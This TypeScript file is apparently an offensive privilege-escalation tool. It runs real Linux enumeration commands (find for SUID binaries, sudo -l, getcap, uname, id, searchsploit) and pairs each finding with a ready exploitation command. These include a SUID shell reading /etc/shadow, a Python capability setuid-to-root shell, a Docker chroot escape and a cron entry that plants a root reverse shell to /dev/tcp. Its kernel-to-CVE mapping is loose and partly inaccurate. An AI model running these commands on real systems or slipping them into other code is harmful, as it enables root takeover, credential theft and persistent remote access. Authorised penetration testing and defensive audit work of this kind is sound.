/**
 * Live Privilege Escalation Checker
 * Runs real system checks to identify privesc vectors.
 * Uses execFile to run: find, getcap, sudo, uname, id, searchsploit, ls, cat
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import * as fs from 'node:fs'

const execFileP = promisify(execFile)

export interface PrivescVector {
  name: string
  category: 'suid' | 'sudo' | 'capability' | 'cron' | 'kernel' | 'group' | 'writable' | 'service'
  severity: 'critical' | 'high' | 'medium' | 'low'
  detail: string
  command: string
  mitreId: string
}

export class LivePrivescChecker {
  async findSuidBinaries(): Promise<PrivescVector[]> {
    const exploitable = new Set(['bash','sh','python','python3','python2','perl','ruby','php','node','nmap','vim','vi','less','more','find','awk','gawk','nawk','mawk','nc','netcat','socat','tee','cp','mv','mkdir','chmod','chown','curl','wget','tar','zip','unzip','7z','env','xargs','strace','ltrace','gdb','ftp','tftp','ssh','rsync','scp'])
    try {
      const result = await execFileP('find', ['/', '-perm', '-4000', '-type', 'f'], { timeout: 30000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: '' }))
      const lines = result.stdout.split('\n').filter(Boolean)
      const vectors: PrivescVector[] = []
      for (const bin of lines) {
        const base = bin.split('/').pop() || ''
        if (exploitable.has(base)) {
          vectors.push({
            name: `SUID: ${bin}`,
            category: 'suid',
            severity: 'critical',
            detail: `Exploitable SUID binary found: ${bin}`,
            command: `${bin} -p -c 'id; cat /etc/shadow'`,
            mitreId: 'T1548.001',
          })
        } else if (bin.trim()) {
          vectors.push({
            name: `SUID: ${bin}`,
            category: 'suid',
            severity: 'medium',
            detail: `SUID binary: ${bin} (check GTFOBins)`,
            command: `ls -la ${bin}`,
            mitreId: 'T1548.001',
          })
        }
      }
      return vectors
    } catch { return [] }
  }

  async checkSudoRules(): Promise<PrivescVector[]> {
    const gtfobins = new Set(['vim','vi','less','more','man','awk','find','python','python3','perl','ruby','php','bash','sh','env','tee','cp','mv','chmod','chown','curl','wget','tar','rsync','nmap','ftp','gdb','nc','netcat','socat','node','cat','head','tail','cut'])
    try {
      const result = await execFileP('sudo', ['-l', '-n'], { timeout: 10000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const out = result.stdout + result.stderr
      const vectors: PrivescVector[] = []
      const lines = out.split('\n')
      for (const line of lines) {
        if (line.includes('NOPASSWD') || line.includes('(ALL)')) {
          const binMatch = line.match(/\/\S+/g)
          if (binMatch) {
            for (const binPath of binMatch) {
              const base = binPath.split('/').pop() || ''
              const sev = gtfobins.has(base) ? 'critical' : 'high'
              vectors.push({
                name: `Sudo NOPASSWD: ${binPath}`,
                category: 'sudo',
                severity: sev,
                detail: `Can run ${binPath} as sudo without password`,
                command: `sudo ${binPath}`,
                mitreId: 'T1548.003',
              })
            }
          }
        }
        if (line.includes('(ALL : ALL) ALL') || line.includes('(ALL) ALL')) {
          vectors.push({
            name: 'Full sudo access',
            category: 'sudo',
            severity: 'critical',
            detail: 'User has full sudo access',
            command: 'sudo su -',
            mitreId: 'T1548.003',
          })
        }
      }
      return vectors
    } catch { return [] }
  }

  async findDangerousCapabilities(): Promise<PrivescVector[]> {
    const dangerous = new Map([
      ['cap_setuid', 'critical'], ['cap_dac_override', 'high'], ['cap_net_raw', 'high'],
      ['cap_sys_admin', 'critical'], ['cap_chown', 'high'], ['cap_fowner', 'high'],
    ])
    try {
      const result = await execFileP('getcap', ['-r', '/'], { timeout: 30000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: '' }))
      const lines = result.stdout.split('\n').filter(Boolean)
      const vectors: PrivescVector[] = []
      for (const line of lines) {
        for (const [cap, sev] of dangerous) {
          if (line.toLowerCase().includes(cap)) {
            const binPath = line.split(' ')[0] || ''
            vectors.push({
              name: `Capability: ${cap} on ${binPath}`,
              category: 'capability',
              severity: sev as 'critical' | 'high',
              detail: line.trim(),
              command: `${binPath} -c 'import os; os.setuid(0); os.system("/bin/bash")'`,
              mitreId: 'T1548.001',
            })
            break
          }
        }
      }
      return vectors
    } catch { return [] }
  }

  async checkKernelVersion(): Promise<PrivescVector[]> {
    const knownVulnKernels: Array<{ pattern: RegExp; cve: string; severity: 'critical' | 'high' }> = [
      { pattern: /^3\.\d+/, cve: 'CVE-2016-5195 (DirtyCow)', severity: 'critical' },
      { pattern: /^4\.[0-9]\b/, cve: 'CVE-2017-7308 / CVE-2016-5195', severity: 'high' },
      { pattern: /^4\.1[0-4]\./, cve: 'CVE-2019-13272 / CVE-2018-18955', severity: 'high' },
      { pattern: /^5\.[0-7]\./, cve: 'CVE-2021-3156 (sudo) / CVE-2021-4034 (polkit)', severity: 'high' },
      { pattern: /^5\.[8-9]\./, cve: 'CVE-2021-4034 (polkit) / CVE-2022-0847 (DirtyPipe)', severity: 'critical' },
      { pattern: /^5\.1[0-5]\./, cve: 'CVE-2022-0847 (DirtyPipe) / CVE-2022-2588', severity: 'critical' },
    ]
    const vectors: PrivescVector[] = []
    try {
      const unameResult = await execFileP('uname', ['-r'], { timeout: 5000 })
      const kernel = unameResult.stdout.trim()
      for (const vk of knownVulnKernels) {
        if (vk.pattern.test(kernel)) {
          vectors.push({
            name: `Vulnerable kernel: ${kernel}`,
            category: 'kernel',
            severity: vk.severity,
            detail: `Kernel ${kernel} may be vulnerable to ${vk.cve}`,
            command: `searchsploit 'linux kernel ${kernel.split('.').slice(0, 2).join('.')}'`,
            mitreId: 'T1068',
          })
        }
      }
      try {
        const sp = await execFileP('searchsploit', ['linux', 'kernel', kernel.split('.').slice(0, 2).join('.')], { timeout: 15000 }).catch(() => ({ stdout: '', stderr: '' }))
        if (sp.stdout.includes('EDB-ID') || sp.stdout.includes('local') || sp.stdout.includes('Privilege')) {
          vectors.push({
            name: `Searchsploit results for kernel ${kernel}`,
            category: 'kernel',
            severity: 'high',
            detail: sp.stdout.slice(0, 500),
            command: `searchsploit -x <exploit-id>`,
            mitreId: 'T1068',
          })
        }
      } catch { /* ignore */ }
    } catch { /* ignore */ }
    return vectors
  }

  async checkGroupMembership(): Promise<PrivescVector[]> {
    const dangerousGroups = new Map([
      ['docker', { severity: 'critical' as const, cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', mitre: 'T1611' }],
      ['lxd', { severity: 'critical' as const, cmd: 'lxc init ubuntu:20.04 privesc -c security.privileged=true', mitre: 'T1611' }],
      ['disk', { severity: 'critical' as const, cmd: 'debugfs /dev/sda1', mitre: 'T1548' }],
      ['sudo', { severity: 'high' as const, cmd: 'sudo su -', mitre: 'T1548.003' }],
      ['adm', { severity: 'medium' as const, cmd: 'cat /var/log/auth.log', mitre: 'T1078' }],
      ['staff', { severity: 'medium' as const, cmd: 'find /usr/local -writable 2>/dev/null', mitre: 'T1548' }],
    ])
    const vectors: PrivescVector[] = []
    try {
      const idResult = await execFileP('id', [], { timeout: 5000 })
      const out = idResult.stdout
      for (const [group, info] of dangerousGroups) {
        if (out.includes(group)) {
          vectors.push({
            name: `Group membership: ${group}`,
            category: 'group',
            severity: info.severity,
            detail: `Current user is in dangerous group: ${group}. Full id: ${out.trim()}`,
            command: info.cmd,
            mitreId: info.mitre,
          })
        }
      }
    } catch { /* ignore */ }
    return vectors
  }

  async checkWritableCrons(): Promise<PrivescVector[]> {
    const cronPaths = ['/etc/crontab', '/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.weekly', '/var/spool/cron']
    const vectors: PrivescVector[] = []
    for (const cronPath of cronPaths) {
      try {
        fs.accessSync(cronPath, fs.constants.W_OK)
        vectors.push({
          name: `Writable cron: ${cronPath}`,
          category: 'cron',
          severity: 'high',
          detail: `${cronPath} is writable by current user`,
          command: `echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> ${cronPath}`,
          mitreId: 'T1053.003',
        })
      } catch { /* ignore */ }
    }
    return vectors
  }

  async runAllChecks(): Promise<{ vectors: PrivescVector[]; summary: string }> {
    const [suid, sudo, caps, kernel, groups, crons] = await Promise.all([
      this.findSuidBinaries().catch(() => [] as PrivescVector[]),
      this.checkSudoRules().catch(() => [] as PrivescVector[]),
      this.findDangerousCapabilities().catch(() => [] as PrivescVector[]),
      this.checkKernelVersion().catch(() => [] as PrivescVector[]),
      this.checkGroupMembership().catch(() => [] as PrivescVector[]),
      this.checkWritableCrons().catch(() => [] as PrivescVector[]),
    ])
    const all = [...suid, ...sudo, ...caps, ...kernel, ...groups, ...crons]
    const critical = all.filter(v => v.severity === 'critical').length
    const high = all.filter(v => v.severity === 'high').length
    const summary = `Found ${all.length} privesc vectors: ${critical} critical, ${high} high`
    return { vectors: all, summary }
  }
}
